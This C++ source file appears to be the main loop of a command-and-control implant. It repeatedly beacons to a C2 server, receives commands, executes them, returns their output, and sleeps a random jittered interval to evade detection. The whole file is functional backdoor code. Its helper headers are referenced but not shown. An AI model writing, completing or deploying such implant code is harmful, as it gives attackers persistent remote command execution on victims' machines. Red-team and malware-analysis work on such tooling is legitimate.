#include "beacon.h"
#include "network.h"
#include "commands.h"
#include "config.h"
#include <iostream>
#include <random>
#include <string>
#include <thread>
#include <chrono>

void start_implant() {
	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<> distrib(kSleepMinSec, kSleepMaxSec);

	std::string agent_id = kAgentId;

	while (true) {

		std::string command_from_c2 = send_beacon(agent_id, "Ping beacon");
		if (!command_from_c2.empty()) {
			std::string response = execute_command(command_from_c2);

			send_beacon(agent_id, response);
		}

		int sleep_time = distrib(gen);
		std::this_thread::sleep_for(std::chrono::seconds(sleep_time));
	}
}